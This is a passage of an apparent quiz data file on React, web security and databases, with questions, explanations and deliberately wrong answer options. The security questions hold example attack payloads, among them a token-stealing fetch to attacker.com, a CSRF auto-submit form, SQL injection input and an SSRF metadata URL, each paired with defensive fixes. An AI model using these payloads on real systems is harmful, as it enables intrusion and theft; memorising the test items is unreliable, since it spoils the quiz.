function FilteredList({ items, query }: { items: Item[]; query: string }) {
  const [filtered, setFiltered] = useState(items);

  useEffect(() => {
    setFiltered(items.filter((i) => i.name.includes(query)));
  }, [items, query]);

  return <List items={filtered} />;
}
\`\`\``,
        explanation: `\`filtered\` is **derived state**: it can be computed entirely from props. Mirroring it into state and syncing with an effect causes several problems:

1. **Wasted renders with stale UI.** When \`query\` changes, React first renders with the *old* \`filtered\`, commits it, runs the effect, sets state, and renders again. Users can briefly see stale results.
2. **Duplicated source of truth** that can drift out of sync (for example, if someone calls \`setFiltered\` elsewhere).
3. More code and more to reason about.

Fix: **compute it during render**.

\`\`\`tsx
const filtered = items.filter((i) => i.name.includes(query));
\`\`\`

If the computation is genuinely expensive, memoize it:

\`\`\`tsx
const filtered = useMemo(
  () => items.filter((i) => i.name.includes(query)),
  [items, query]
);
\`\`\`

The React docs call this out under "You Might Not Need an Effect": effects are for synchronizing with *external* systems, not for transforming data for rendering.`,
        answers: [
          {
            answer: `\`filtered\` is derived state. The effect causes an extra render that briefly shows stale results and creates a second source of truth. Compute it during render instead, wrapped in \`useMemo\` if it's expensive.`,
            isCorrect: true,
          },
          {
            answer: `The effect is missing \`setFiltered\` in its dependency array, which causes an infinite loop.`,
            isCorrect: false,
          },
          {
            answer: `Nothing is wrong. Derived values must live in state, or React can't detect that they changed.`,
            isCorrect: false,
          },
          {
            answer: `\`useState(items)\` should be \`useState(() => items)\`. The non-lazy initializer re-filters on every render.`,
            isCorrect: false,
          },
        ],
      },
    ],
  },
  {
    name: "Security",
    questions: [
      {
        question: `Your Node.js API sets the following HTTP response header. An attacker injects \`<script>alert(document.cookie)</script>\` into server-rendered HTML. Which directive blocks execution, and why does adding \`'unsafe-inline'\` to \`script-src\` completely defeat the policy?

\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self'
\`\`\``,
        explanation: `**\`script-src 'self'\`** is the operative directive. It tells the browser to only execute scripts that originate from the same origin as the document — this blocks inline \`<script>\` tags and inline event handlers (\`onclick="..."\`) entirely, which are the primary XSS delivery mechanisms.

Adding **\`'unsafe-inline'\`** to \`script-src\` re-enables all inline script execution. Since XSS attacks inject inline code, allowing \`'unsafe-inline'\` makes the entire CSP useless against XSS.

The modern alternative is a **nonce-based CSP**: the server generates a cryptographically random nonce per request, includes \`'nonce-<value>'\` in \`script-src\`, and adds \`nonce="<value>"\` to every legitimate \`<script>\` tag. Injected scripts won't carry the correct nonce and are blocked. A **hash-based** approach (\`'sha256-<hash>'\`) works similarly for static inline scripts. Both strategies allow specific inline scripts without enabling arbitrary inline execution.`,
        answers: [
          {
            answer: "`script-src 'self'` blocks the injected inline script. Adding `'unsafe-inline'` re-enables all inline scripts and completely undermines the XSS protection.",
            isCorrect: true,
          },
          {
            answer: "`default-src 'self'` blocks the script; `script-src` only applies to external script files, not inline tags.",
            isCorrect: false,
          },
          {
            answer: "Neither directive blocks inline scripts by default — you must explicitly add `script-src 'none'`.",
            isCorrect: false,
          },
          {
            answer: "`script-src 'self'` blocks the script, and `'unsafe-inline'` is only dangerous for cross-origin scripts, not same-origin injections.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `An attacker successfully injects the following XSS payload into your web application. The app stores its JWT in \`localStorage\`.

\`\`\`javascript
fetch('https://attacker.com/steal?t=' + localStorage.getItem('auth_token'));
\`\`\`

What is exfiltrated, and what storage mechanism prevents this entire class of attack?`,
        explanation: `The complete JWT is exfiltrated to the attacker's server. With a valid JWT the attacker can impersonate the user for the token's entire lifetime — there is typically no server-side session state to invalidate. This is the fundamental risk of storing authentication tokens in \`localStorage\` (or \`sessionStorage\`): **any JavaScript running on the page has full read access to it**, including injected scripts.

**HttpOnly cookies** prevent this attack. A cookie with the \`HttpOnly\` flag set is inaccessible to JavaScript — \`document.cookie\` does not include it, and \`localStorage\` / \`sessionStorage\` APIs are unrelated. The browser automatically attaches the cookie to same-origin requests, but no script (including injected XSS payloads) can read or exfiltrate it.

The complete secure cookie configuration for a JWT:
\`\`\`
Set-Cookie: auth_token=<jwt>; HttpOnly; Secure; SameSite=Strict; Path=/
\`\`\`
- \`HttpOnly\`: no JS access
- \`Secure\`: HTTPS only
- \`SameSite=Strict\`: CSRF protection — cookie is not sent on cross-origin requests

The trade-off: HttpOnly cookies require the same origin for API calls (or careful CORS configuration). SPAs talking to a separate API domain often need a \`SameSite=None; Secure\` cookie with a strict CORS allowlist — still far safer than \`localStorage\`.`,
        answers: [
          {
            answer: "The full JWT is stolen and can be used to impersonate the user. `HttpOnly` cookies prevent this — JavaScript cannot read `HttpOnly` cookies, so the XSS payload cannot exfiltrate the token.",
            isCorrect: true,
          },
          {
            answer: "Only the JWT header and payload are readable; the signature is never stored in `localStorage`, so the attacker cannot forge requests.",
            isCorrect: false,
          },
          {
            answer: "The `fetch` request is blocked by the browser's Same-Origin Policy (SOP) because the destination domain differs from the app's origin.",
            isCorrect: false,
          },
          {
            answer: "Nothing is exfiltrated — `localStorage` is sandboxed per tab and cannot be accessed by dynamically injected scripts.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `A Node.js API stores user passwords by hashing them with SHA-256 before saving to the database. A security reviewer flags this as insecure even though SHA-256 is cryptographically strong. Why is SHA-256 the wrong tool for password storage, and what should be used instead?`,
        explanation: `SHA-256 is a **fast, general-purpose cryptographic hash** — and *fast* is exactly the problem for password storage. Two weaknesses make raw SHA-256 unsuitable:

1. **Speed enables brute force.** Modern GPUs and ASICs compute *billions* of SHA-256 hashes per second. If a database leaks, an attacker can try enormous numbers of candidate passwords per second against each hash. Fast hashing is a feature for integrity/signatures but a liability for passwords.

2. **No built-in salt → rainbow tables and shared hashes.** Without a per-user salt, identical passwords produce identical hashes, so an attacker sees which users share a password and can use precomputed **rainbow tables** to reverse common passwords instantly.

The correct tool is a **slow, salted, adaptive password-hashing function** designed specifically for this purpose:
- **bcrypt** — battle-tested, includes a per-hash salt automatically, with a tunable **work factor** (cost) you raise as hardware improves.
- **scrypt** and **Argon2** (Argon2id is the current recommendation, PHC winner) — additionally **memory-hard**, defeating GPU/ASIC parallelism by requiring large amounts of RAM per guess.

Example with bcrypt:
\`\`\`javascript
import bcrypt from "bcrypt";
const hash = await bcrypt.hash(password, 12); // cost factor 12
const ok   = await bcrypt.compare(password, hash);
\`\`\`

The deliberate slowness (tens of milliseconds per hash) is negligible for a single legitimate login but makes large-scale offline cracking economically infeasible. The salt is generated and stored inside the bcrypt output automatically, so identical passwords yield different hashes.`,
        answers: [
          {
            answer: "SHA-256 is designed to be fast and is unsalted, so a leaked database can be brute-forced at billions of guesses per second and is vulnerable to rainbow tables. Use a slow, salted, adaptive hash like bcrypt, scrypt, or Argon2id instead.",
            isCorrect: true,
          },
          {
            answer: "SHA-256 is reversible if you know the input length, so attackers can decrypt the passwords directly. Use AES-256 encryption for passwords instead.",
            isCorrect: false,
          },
          {
            answer: "SHA-256 produces only 256 bits of output, which is too short to be secure for passwords. Use SHA-512 to double the hash length and fix the vulnerability.",
            isCorrect: false,
          },
          {
            answer: "SHA-256 is fine as long as you hash the password twice (SHA-256 of the SHA-256); double hashing adds the needed slowness and salting automatically.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `What's the vulnerability in this Express endpoint, and what's the correct fix?

\`\`\`typescript
app.get("/users", async (req, res) => {
  const { rows } = await pool.query(
    \`SELECT id, email FROM users WHERE name = '\${req.query.name}'\`
  );
  res.json(rows);
});
\`\`\``,
        explanation: `User input is interpolated directly into the SQL string, which is a classic **SQL injection**. A request like \`/users?name=' OR '1'='1\` produces:

\`\`\`sql
SELECT id, email FROM users WHERE name = '' OR '1'='1'
\`\`\`

That returns every user. More dangerous payloads can use \`UNION SELECT\` to read other tables or, depending on driver settings, stack additional statements.

The fix is **parameterized queries** (prepared statements). The SQL text and the values are sent to the database **separately**, so input is always treated as data and never parsed as SQL:

\`\`\`typescript
const { rows } = await pool.query(
  "SELECT id, email FROM users WHERE name = $1",
  [req.query.name]
);
\`\`\`

Query builders and ORMs (Knex, Prisma, Drizzle) parameterize for you, as long as you don't use their "raw" escape hatches with string interpolation.

Hand-rolled escaping (like replacing \`'\`) is fragile and easy to bypass via encodings and edge cases. Client-side validation can be skipped entirely by calling the API directly. Changing GET to POST doesn't change how the string is built.`,
        answers: [
          {
            answer: `SQL injection. Input is concatenated into the query string. Use a parameterized query (\`WHERE name = $1\` with \`[req.query.name]\`) so the value is never parsed as SQL.`,
            isCorrect: true,
          },
          {
            answer: `SQL injection. Fix it by escaping single quotes with \`name.replace(/'/g, "''")\` before interpolating.`,
            isCorrect: false,
          },
          {
            answer: `Cross-site scripting. Fix it by HTML-encoding \`rows\` before calling \`res.json\`.`,
            isCorrect: false,
          },
          {
            answer: `Sensitive data in the URL. Change the endpoint to POST so the name is sent in the body, which prevents tampering.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `Your app authenticates users with a session cookie. An attacker hosts a page that silently auto-submits this form when a logged-in user visits it:

\`\`\`html
<form action="https://bank.example.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="5000" />
</form>
<script>document.forms[0].submit()</script>
\`\`\`

Which defense actually prevents this attack?`,
        explanation: `This is **Cross-Site Request Forgery (CSRF)**. The browser automatically attaches cookies to requests to \`bank.example.com\`, even when another site initiates the request. The server sees a valid session and performs the transfer.

Effective defenses:
- **\`SameSite\` cookies.** \`SameSite=Lax\` (the default in modern browsers if unspecified) prevents the cookie being sent on cross-site POSTs. \`SameSite=Strict\` also blocks it on top-level cross-site navigations.
- **Anti-CSRF tokens.** Use a per-session or per-request secret, either embedded in forms (synchronizer token) or sent via a double-submit cookie and header. A cross-site page can't read the token, so it can't include it.
- **Checking \`Origin\`/\`Sec-Fetch-Site\` headers** on state-changing requests.

Use them together for defense in depth.

Why the others fail:
- **\`HttpOnly\`** stops JavaScript from *reading* the cookie (an XSS mitigation), but the browser still *sends* it.
- **CORS** controls whether a cross-origin script can *read the response*. A plain HTML form POST is a "simple request": it isn't preflighted and is sent regardless.
- **HTTPS** protects data in transit and does nothing against forged requests.`,
        answers: [
          {
            answer: `Set the session cookie to \`SameSite=Lax\` or \`Strict\` and require an anti-CSRF token (or verify the \`Origin\` header) on state-changing requests.`,
            isCorrect: true,
          },
          {
            answer: `Mark the session cookie \`HttpOnly\` so the attacker's page can't use it.`,
            isCorrect: false,
          },
          {
            answer: `Configure a strict CORS policy that only allows \`https://bank.example.com\`, so the browser blocks the cross-origin POST.`,
            isCorrect: false,
          },
          {
            answer: `Serve the site only over HTTPS with HSTS, so requests from other origins are rejected.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `A developer adds this middleware to "fix CORS errors" for a cookie-authenticated API. What's the security impact?

\`\`\`typescript
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", req.headers.origin ?? "*");
  res.setHeader("Access-Control-Allow-Credentials", "true");
  next();
});
\`\`\``,
        explanation: `Browsers won't allow \`Access-Control-Allow-Origin: *\` together with credentials, so developers sometimes **reflect** the request's \`Origin\` header instead. That effectively allows *every* origin, with credentials.

The result: if a logged-in user visits \`https://evil.example\`, a script on that page can run:

\`\`\`javascript
fetch("https://api.yourapp.com/me", { credentials: "include" })
  .then((r) => r.json())
  .then(exfiltrate);
\`\`\`

The browser attaches the user's cookies, and because the response says \`evil.example\` is allowed with credentials, it **lets the attacker's script read the response**. That exposes private data, and any CSRF tokens the API returns.

Remember: CORS doesn't protect your server from requests. It's a browser mechanism that decides which origins may **read** responses. Loosening it widens who can read authenticated data.

Fix: validate \`Origin\` against an **explicit allowlist** of trusted origins, set \`Vary: Origin\`, and only send \`Allow-Credentials: true\` for those origins.`,
        answers: [
          {
            answer: `Any website can make credentialed requests on behalf of a logged-in user and read the responses, because the server reflects every origin with credentials allowed. Use an explicit origin allowlist instead.`,
            isCorrect: true,
          },
          {
            answer: `None. Browsers ignore \`Access-Control-Allow-Origin\` when it's set dynamically from the request, so this behaves like \`*\`.`,
            isCorrect: false,
          },
          {
            answer: `It only affects unauthenticated endpoints. Browsers never send cookies on cross-origin \`fetch\` calls, even with \`credentials: "include"\`.`,
            isCorrect: false,
          },
          {
            answer: `It enables SQL injection, because the \`Origin\` header is copied into a response header without sanitization.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `An authorization middleware reads a JWT from the \`Authorization\` header like this. What's the most serious flaw?

\`\`\`typescript
import jwt from "jsonwebtoken";

function requireAdmin(req, res, next) {
  const token = req.headers.authorization?.replace("Bearer ", "");
  const payload = jwt.decode(token) as { sub: string; role: string };
  if (payload?.role !== "admin") return res.sendStatus(403);
  req.userId = payload.sub;
  next();
}
\`\`\``,
        explanation: `\`jwt.decode\` only **base64url-decodes** the token's payload. It **doesn't verify the signature**. A JWT's header and payload are readable and editable by anyone, so an attacker can craft a token with \`{"role":"admin"}\`, give it any (or no) signature, and the middleware trusts it.

Always use **\`jwt.verify\`** with the correct key, and **pin the accepted algorithms**:

\`\`\`typescript
const payload = jwt.verify(token, publicKey, {
  algorithms: ["RS256"],
  issuer: "https://auth.example.com",
  audience: "my-api",
});
\`\`\`

Pinning algorithms prevents attacks where the token's own \`alg\` header picks the verification method. Examples include \`alg: "none"\`, or **algorithm confusion**: switching RS256 to HS256 so the server's *public* key is used as an HMAC secret. Also validate \`exp\`, \`iss\`, and \`aud\`. \`verify\` checks \`exp\` by default.

JWTs aren't encrypted by default, so they also shouldn't contain secrets. That's a separate issue from this flaw.`,
        answers: [
          {
            answer: `\`jwt.decode\` doesn't verify the signature, so anyone can forge a token with \`role: "admin"\`. Use \`jwt.verify\` with the right key and a pinned \`algorithms\` list (and check \`iss\`/\`aud\`).`,
            isCorrect: true,
          },
          {
            answer: `The token should be read from a cookie instead of the \`Authorization\` header. Bearer tokens can be forged in transit.`,
            isCorrect: false,
          },
          {
            answer: `\`jwt.decode\` throws on expired tokens, so the middleware crashes for logged-out users. Wrap it in \`try/catch\`.`,
            isCorrect: false,
          },
          {
            answer: `The main flaw is that JWT payloads are encrypted, so the role should be fetched from the database instead.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `Your Node.js service, running on AWS EC2, has an "import from URL" feature: it fetches whatever URL the user provides and stores the response. An attacker submits \`http://169.254.169.254/latest/meta-data/iam/security-credentials/\`. What's this attack, and what's the most effective mitigation?`,
        explanation: `This is **Server-Side Request Forgery (SSRF)**. The attacker makes *your server* send requests to destinations they can't reach directly: internal services, admin panels, or here, the **cloud instance metadata endpoint**, which can return temporary IAM credentials for the instance's role. This was the core of the 2019 Capital One breach.

Effective mitigations, layered:
- **Allowlist** destination hosts or schemes where possible (only \`https\`, only known domains).
- If arbitrary URLs are required, **resolve DNS yourself and reject private, loopback, and link-local ranges** (\`10/8\`, \`172.16/12\`, \`192.168/16\`, \`127/8\`, \`169.254/16\`, \`::1\`, \`fc00::/7\`, etc.). **Connect to the resolved IP** you checked, so DNS rebinding can't swap it after validation, and **re-validate on every redirect** (or disable redirects).
- **Network egress controls**: run the fetcher in an isolated subnet or proxy that can't reach internal ranges.
- On AWS, **require IMDSv2**, which needs a session token obtained with a PUT request that simple SSRF can't usually perform.

String-matching the URL (e.g. blocking \`"169.254"\`) is easy to bypass with decimal IPs (\`http://2852039166/\`), alternate encodings, or DNS names that resolve to internal addresses.`,
        answers: [
          {
            answer: `Server-Side Request Forgery (SSRF). Allowlist destinations, or resolve the hostname and block private and link-local IPs (re-checking on redirects), add egress controls, and enforce IMDSv2.`,
            isCorrect: true,
          },
          {
            answer: `Cross-site request forgery. Add a CSRF token to the import form.`,
            isCorrect: false,
          },
          {
            answer: `Open redirect. Validate that the URL's path doesn't contain \`..\` segments.`,
            isCorrect: false,
          },
          {
            answer: `SSRF. Block any URL string that contains \`169.254\`, since that fully covers metadata access.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `An API merges JSON request bodies into a settings object using this helper. An attacker sends \`{"__proto__": {"isAdmin": true}}\`. What happens?

\`\`\`javascript
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === "object" && source[key] !== null) {
      target[key] = merge(target[key] ?? {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

merge({}, JSON.parse(req.body));
\`\`\``,
        explanation: `This is **prototype pollution**. \`JSON.parse\` creates an **own property** literally named \`"__proto__"\`, and \`for...in\` enumerates it. Inside \`merge\`:

- \`target["__proto__"]\` on a normal object doesn't return an own property. It goes through the \`__proto__\` accessor and returns **\`Object.prototype\`**.
- \`merge(Object.prototype, { isAdmin: true })\` then sets \`Object.prototype.isAdmin = true\`.

Now **every object in the process** inherits \`isAdmin === true\`. Code like \`if (user.isAdmin)\` passes for any user object without its own \`isAdmin\` property. Depending on the gadgets available, prototype pollution can escalate to auth bypass, denial of service, or even RCE (e.g. via polluted options passed to \`child_process\`).

Mitigations:
- Skip dangerous keys (\`__proto__\`, \`constructor\`, \`prototype\`) in merge or clone utilities, or check \`Object.hasOwn\` on the target.
- Use \`Object.create(null)\` objects or \`Map\` for user-keyed data.
- Validate input against a strict schema (Zod, Ajv with \`additionalProperties: false\`).
- Consider \`node --disable-proto=delete\`, or freezing \`Object.prototype\`.`,
        answers: [
          {
            answer: `Prototype pollution. \`target["__proto__"]\` resolves to \`Object.prototype\`, so \`isAdmin: true\` is written onto it and every object in the process now inherits \`isAdmin === true\`.`,
            isCorrect: true,
          },
          {
            answer: `Nothing. \`JSON.parse\` strips \`__proto__\` keys, so the payload becomes an empty object.`,
            isCorrect: false,
          },
          {
            answer: `Only the merged settings object gets \`isAdmin: true\` as an own property, which is harmless if it's never checked.`,
            isCorrect: false,
          },
          {
            answer: `The merge throws a \`TypeError\` because \`Object.prototype\` is frozen by default in Node.js.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `What's the vulnerability in this authenticated endpoint?

\`\`\`typescript
app.get("/api/invoices/:id", requireAuth, async (req, res) => {
  const invoice = await db.invoice.findUnique({
    where: { id: req.params.id },
  });
  if (!invoice) return res.sendStatus(404);
  res.json(invoice);
});
\`\`\``,
        explanation: `This is **Broken Object Level Authorization (BOLA)**, also called **Insecure Direct Object Reference (IDOR)**. It's #1 on the OWASP API Security Top 10.

\`requireAuth\` only establishes *who* the caller is (**authentication**). Nothing checks whether that user is *allowed to access this particular invoice* (**authorization**). Any logged-in user can read anyone's invoice by changing the \`id\` in the URL.

Fix: scope every data access to the caller's permissions, ideally inside the query itself:

\`\`\`typescript
const invoice = await db.invoice.findFirst({
  where: { id: req.params.id, customerId: req.user.customerId },
});
if (!invoice) return res.sendStatus(404); // 404 avoids revealing existence
\`\`\`

In multi-tenant systems, enforce tenant scoping centrally (repository layer, Postgres row-level security) so a single forgotten check doesn't leak data.

Unguessable IDs (UUIDs) reduce enumeration but aren't an access control: IDs leak through URLs, logs, and shared links. Rate limiting only slows down exploitation.`,
        answers: [
          {
            answer: `Broken object-level authorization (IDOR). Any authenticated user can fetch any invoice by ID. Scope the query to the caller (e.g. \`where: { id, customerId: req.user.customerId }\`).`,
            isCorrect: true,
          },
          {
            answer: `There's no vulnerability. \`requireAuth\` ensures only legitimate users reach the handler.`,
            isCorrect: false,
          },
          {
            answer: `Sequential IDs are enumerable. Switching invoice IDs to UUIDs fully fixes the issue.`,
            isCorrect: false,
          },
          {
            answer: `The 404 response leaks information. Return 200 with an empty body instead.`,
            isCorrect: false,
          },
        ],
      },
    ],
  },
  {
    name: "Databases: SQL & NoSQL",
    questions: [
      {
        question: `Given the query below, what rank values does \`RANK()\` assign when two employees in the same department share the highest salary? How does this differ from \`DENSE_RANK()\`?

\`\`\`sql
SELECT
  name,
  department,
  salary,
  RANK()       OVER (PARTITION BY department ORDER BY salary DESC) AS rnk,
  DENSE_RANK() OVER (PARTITION BY department ORDER BY salary DESC) AS dense_rnk
FROM employees;
\`\`\``,
        explanation: `**\`RANK()\`** assigns the same rank to tied rows, then **skips** subsequent ranks by the number of ties. Two employees tied for first both receive rank \`1\`, and the next distinct salary receives rank \`3\` — rank \`2\` is skipped. Think of it like an Olympic podium: two gold medalists, no silver, then bronze.

**\`DENSE_RANK()\`** also assigns the same rank to tied rows but **never skips** ranks. The same two tied employees get rank \`1\`, and the next employee gets rank \`2\` regardless of the tie count.

Practical guidance:
- Use \`RANK()\` when you need to know "how many rows rank above this one" (including peers) — useful for leaderboards where gaps convey meaning.
- Use \`DENSE_RANK()\` when you want a compact, gap-free ranking — e.g., "return the top 3 distinct salary levels per department."
- \`ROW_NUMBER()\` assigns a unique sequential integer to every row and breaks ties arbitrarily — use it when you need exactly one result per position.`,
        answers: [
          {
            answer: "`RANK()` gives both tied employees rank `1` and skips rank `2`, so the next employee gets rank `3`. `DENSE_RANK()` gives rank `1` then `2` with no gap.",
            isCorrect: true,
          },
          {
            answer: "`RANK()` assigns consecutive ranks with no gaps — it is identical to `DENSE_RANK()`.",
            isCorrect: false,
          },
          {
            answer: "`RANK()` arbitrarily assigns rank `1` to one tied employee and rank `2` to the other to ensure uniqueness.",
            isCorrect: false,
          },
          {
            answer: "`RANK()` returns `NULL` for tied rows and requires an explicit tie-breaker column in `ORDER BY`.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `In MongoDB, you are modeling a blog platform. Each post has comments; comments are **always** fetched together with their parent post, and no post will ever exceed a few hundred comments. Which data modeling strategy is correct, and why would the reference pattern cause problems here?`,
        explanation: `**Embed comments as an array inside the post document.** MongoDB's document model is optimized around one principle: *data that is accessed together should be stored together*. When comments are always read with their post and the count is bounded, a single \`db.posts.findOne({ _id })\` retrieves the complete post-with-comments — no join, no second round-trip, and the result fits comfortably within MongoDB's 16 MB document limit.

The **reference pattern** (comments in a separate collection linked by \`post_id\`) adds unnecessary complexity in this scenario: you must use a \`$lookup\` aggregation stage (MongoDB's join) or issue two queries in the application, both of which hurt read performance without any benefit when comments are always co-read with the post.

The reference pattern is the right choice when:
- Comment counts are unbounded (risk of hitting the 16 MB document limit).
- Comments must be queried independently, paginated at scale, or shared across parents.
- Concurrent writes to a single post document create lock contention.

A common mistake is applying relational normalization instincts to MongoDB. The correct rule is to **model for your access patterns**, not for normalization.`,
        answers: [
          {
            answer: "Embed comments as an array within the post document — data accessed together should be stored together, and bounded size makes a single-document read safe and efficient.",
            isCorrect: true,
          },
          {
            answer: "Store comments in a separate collection with a `post_id` reference — normalization prevents data duplication and is always preferred.",
            isCorrect: false,
          },
          {
            answer: "Store arrays of comment `_id` references inside the post document, then batch-fetch comments in a second query.",
            isCorrect: false,
          },
          {
            answer: "Duplicate comments in both the post document and a standalone collection to optimize both read paths simultaneously.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `A distributed NoSQL database is described as **AP** (Available and Partition-tolerant). According to the CAP theorem, what consistency guarantee does it sacrifice, and what does "eventual consistency" mean in practice for an application reading user profile data?`,
        explanation: `The **CAP theorem** (Brewer's theorem) states that a distributed system can guarantee at most two of three properties simultaneously:
- **C**onsistency: every read returns the most recent write (or an error)
- **A**vailability: every request receives a (non-error) response, even if it may be stale
- **P**artition tolerance: the system keeps operating when network partitions split nodes

Since real distributed systems cannot eliminate network partitions, the practical trade-off is between **CP** (consistent under partition, may return errors) and **AP** (available under partition, may return stale data).

**AP databases** (Cassandra, DynamoDB, CouchDB) prioritize staying responsive over returning the most recent value. During a network partition, different replicas may accept writes independently and diverge. After the partition heals, the nodes reconcile via anti-entropy processes and converge on the same value. This is **eventual consistency** — a read may return a stale profile picture for a few seconds after an update, but all replicas will eventually agree.

For user profile reads this is usually acceptable. For inventory deductions or bank balances where two stale reads can both permit an operation that should be rejected, AP systems require application-level conflict resolution (e.g., last-write-wins, CRDTs, or read-your-own-writes routing).`,
        answers: [
          {
            answer: "It sacrifices strong consistency. Reads may return stale data during a partition. 'Eventual consistency' means all replicas will converge to the same value after the partition heals, but there is no guarantee of seeing the latest write immediately.",
            isCorrect: true,
          },
          {
            answer: "It sacrifices partition tolerance — AP databases are only deployed in single-datacenter environments where network splits cannot occur.",
            isCorrect: false,
          },
          {
            answer: "It sacrifices availability — AP systems return errors on reads during a partition to avoid serving stale data.",
            isCorrect: false,
          },
          {
            answer: "The CAP theorem only applies to SQL databases; NoSQL databases like Cassandra operate outside its constraints by using gossip protocols.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `Two concurrent database transactions both execute the following logic against a \`READ COMMITTED\` isolation level. The initial account balance is $1,000.

\`\`\`sql
-- Transaction A and Transaction B run simultaneously:

-- Step 1: both check the balance
SELECT balance FROM accounts WHERE id = 42;  -- both see $1,000

-- Step 2: both confirm $1,000 >= $800, then debit
UPDATE accounts SET balance = balance - 800 WHERE id = 42;
COMMIT;
\`\`\`

What problem occurs, and what is the standard SQL fix?`,
        explanation: `This is the **check-then-act race condition** (a form of write skew). Both transactions read the same balance ($1,000) before either commits. Both pass the "sufficient funds" check ($1,000 ≥ $800) and both execute the debit. The final balance is $1,000 − $800 − $800 = **−$600** — an overdraft that the check should have prevented.

\`READ COMMITTED\` only prevents reading *uncommitted* dirty data — it does not prevent two transactions from both reading the same pre-update value before either writes.

**Standard fixes:**

1. **\`SELECT ... FOR UPDATE\`**: acquires a row-level exclusive lock at read time. Transaction B's \`SELECT ... FOR UPDATE\` blocks until A commits. B then re-reads $200 and can correctly abort.

2. **Atomic conditional UPDATE**:
\`\`\`sql
UPDATE accounts SET balance = balance - 800
WHERE id = 42 AND balance >= 800;
-- check rows affected: if 0, insufficient funds
\`\`\`
This collapses the check and update into a single atomic operation that the database serializes.

3. **\`SERIALIZABLE\` isolation**: the database detects the read-write conflict and aborts one transaction automatically.`,
        answers: [
          {
            answer: "Both transactions read $1,000 before either commits, so both consider the debit valid and execute it — resulting in a -$600 balance. Fix: use `SELECT ... FOR UPDATE` to lock the row at read time, or use a single atomic conditional `UPDATE ... WHERE balance >= 800`.",
            isCorrect: true,
          },
          {
            answer: "`READ COMMITTED` prevents this race — Transaction B blocks on the `UPDATE` until Transaction A commits, then re-reads the updated balance of $200 and automatically aborts.",
            isCorrect: false,
          },
          {
            answer: "The `UPDATE` uses `balance - 800` which is applied to the latest committed value, so the database correctly serializes both debits and the final balance is $200.",
            isCorrect: false,
          },
          {
            answer: "This is a phantom read, which only occurs in `SELECT` queries with range conditions — point lookups like `WHERE id = 42` are immune.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `This query is slow on a 50-million-row \`orders\` table. \`EXPLAIN ANALYZE\` shows a **Seq Scan**. There is already a B-tree index on \`(customer_id)\`. Why isn't it used efficiently, and what index would make this query an index-only scan?

\`\`\`sql
SELECT customer_id, status, total
FROM orders
WHERE customer_id = 12345 AND status = 'shipped';
\`\`\``,
        explanation: `Two things are happening.

First, a single-column index on \`(customer_id)\` *can* be used to find rows for customer \`12345\`, but if that customer has many orders the planner must then fetch each matching heap row to check \`status = 'shipped'\` and to read \`total\`. When the estimated number of matching rows is large relative to the table, the planner may decide a **sequential scan** is cheaper than many random heap lookups — which is what \`EXPLAIN\` is showing.

The fix is a **composite index** that matches both the filter and the returned columns:

\`\`\`sql
CREATE INDEX idx_orders_cust_status_total
ON orders (customer_id, status) INCLUDE (total);
\`\`\`

- \`(customer_id, status)\` lets the index seek directly to rows matching *both* predicates — column order matters: the equality columns come first.
- The \`INCLUDE (total)\` clause stores \`total\` in the index leaf pages (a **covering index**). Now every column the query needs — \`customer_id\`, \`status\`, \`total\` — is available from the index alone.

Because all needed columns live in the index, PostgreSQL can perform an **index-only scan**, skipping heap access entirely (given the visibility map is up to date via \`VACUUM\`). This turns a 50-million-row seq scan into a narrow index seek.

Rule of thumb for composite indexes: **equality columns first, then range columns, then included/covering columns.**`,
        answers: [
          {
            answer: "The single-column index doesn't cover `status` or `total`, so matching many rows leads the planner to a seq scan. A composite covering index `(customer_id, status) INCLUDE (total)` enables an index-only scan with no heap access.",
            isCorrect: true,
          },
          {
            answer: "PostgreSQL never uses B-tree indexes for `AND` conditions on two columns; you must create a separate index on `status` and let the planner do a bitmap `AND`.",
            isCorrect: false,
          },
          {
            answer: "The index is unused because `customer_id` is an integer; indexes only accelerate string columns, so casting `customer_id` to text would fix it.",
            isCorrect: false,
          },
          {
            answer: "Sequential scans are always faster than index scans on large tables, so the query is already optimal and no index change will help.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `An endpoint that lists 50 blog posts with their authors is slow. The ORM code is below. What's the problem, and what's the standard fix?

\`\`\`typescript
const posts = await Post.findAll({ limit: 50 });

for (const post of posts) {
  post.author = await User.findByPk(post.authorId);
}
\`\`\``,
        explanation: `This is the **N+1 query problem**: 1 query fetches the posts, then **N** more queries (one per post) fetch the authors. That's 51 sequential database round trips. Network latency dominates, and the cost grows linearly with page size.

Standard fixes:
- **Eager loading / JOIN.** Let the ORM fetch posts and authors together (\`Post.findAll({ include: User })\`, Prisma \`include\`, or a SQL \`JOIN\`).
- **Batching.** Collect the IDs and run one \`WHERE id IN (...)\` / \`= ANY($1)\` query, then stitch the results in memory.
- In GraphQL resolvers, **DataLoader** batches and deduplicates the per-field lookups within a single tick.

Either way the endpoint makes 1–2 queries instead of N+1. N+1 problems often hide behind lazy-loaded ORM relations, so query logging or APM tracing in development is the best way to spot them.`,
        answers: [
          {
            answer: `It's an N+1 query problem: one query for the posts plus one per post for its author. Eager-load with a JOIN/\`include\`, or batch the lookups into one \`WHERE id IN (...)\` query (e.g. with DataLoader).`,
            isCorrect: true,
          },
          {
            answer: `\`findByPk\` bypasses the index on the primary key. Add an index on \`users.id\`.`,
            isCorrect: false,
          },
          {
            answer: `The loop is slow because \`await\` blocks the database connection pool. Remove \`await\` and the queries will run in parallel at no extra cost.`,
            isCorrect: false,
          },
          {
            answer: `The \`limit: 50\` forces a full table scan. Use cursor-based pagination instead.`,
            isCorrect: false,
          },
        ],
      },
      {
